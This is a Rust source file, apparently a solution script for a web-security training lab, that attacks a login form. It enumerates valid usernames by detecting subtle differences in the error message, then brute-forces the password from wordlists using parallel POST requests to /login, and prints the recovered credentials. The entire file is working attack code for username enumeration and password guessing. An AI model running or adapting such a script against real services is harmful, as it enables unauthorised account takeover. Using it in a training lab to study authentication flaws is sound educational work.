use rayon::prelude::*;
use server_side_authentication::{HTTP_CLIENT, generate_clap_parser};
use std::{
    fs,
    io::{Write, stdout},
    sync::{
        Arc,
        atomic::{AtomicBool, Ordering},
    },
    time::{Duration, Instant},
};

fn enumerate_username(lab_url: &str, username: &str) -> Option<String> {
    print!("[~] Trying Username: {}\r", username);
    stdout().flush().unwrap();

    let response = HTTP_CLIENT
        .post(format!("{}/login", lab_url))
        .form(&[("username", username), ("password", "test")])
        .send()
        .expect("Failed to make the POST request to /login");

    if !response
        .text()
        .expect("Failed to extract text")
        .contains("Invalid username or password.")
    {
        return Some(username.to_string());
    }

    None
}

fn enumerate_password(lab_url: &str, username: &str, password: &str) -> Option<String> {
    print!("[~] Trying Password: {}\r", password);
    stdout().flush().unwrap();

    let response = HTTP_CLIENT
        .post(format!("{}/login", lab_url))
        .form(&[("username", username), ("password", password)])
        .send()
        .expect("Failed to make the POST request to /login");

    if !response
        .text()
        .expect("Failed to extract text")
        .contains("Invalid username or password ")
    {
        return Some(password.to_string());
    }

    None
}

fn main() {
    let args = generate_clap_parser();

    let lab_url = args.lab_url.as_str().trim_end_matches("/");

    let username_stop_flag: Arc<AtomicBool> = Arc::new(AtomicBool::new(false));
    let password_stop_flag: Arc<AtomicBool> = Arc::new(AtomicBool::new(false));

    let start_time: Instant = Instant::now();

    logger::info("Enumerating Username");

    let username = fs::read_to_string("../payloads/authentication/usernames.txt")
        .expect("File not found: usernames.txt")
        .par_lines()
        .find_map_first(|username| {
            if username_stop_flag.load(Ordering::Relaxed) {
                return None;
            }

            let result: Option<String> = enumerate_username(lab_url, username);

            if let Some(value) = result {
                username_stop_flag.store(true, Ordering::Relaxed);
                return Some(value);
            }

            None
        })
        .expect("[-] Failed to enumerate username.");

    println!();
    logger::success(format!("Username Found: {}", username).as_str());

    logger::info("Enumerating Password");

    let password: String = fs::read_to_string("../payloads/authentication/passwords.txt")
        .expect("File not found: passwords.txt")
        .par_lines()
        .find_map_first(|password| {
            if password_stop_flag.load(Ordering::Relaxed) {
                return None;
            }

            let result: Option<String> = enumerate_password(lab_url, &username, password);

            if let Some(value) = result {
                password_stop_flag.store(true, Ordering::Relaxed);
                return Some(value);
            }

            None
        })
        .expect("[-] Failed to enumerate password");

    println!();
    logger::success(format!("Password Found: {}", password).as_str());

    let total_time_taken: Duration = start_time.elapsed();
    logger::info(format!("Total Time Taken: {}s", total_time_taken.as_secs_f64()).as_str());

    logger::success(format!("Username: {}", username).as_str());
    logger::success(format!("Password: {}", password).as_str());
    logger::success("Lab solved successfully!!!");
}
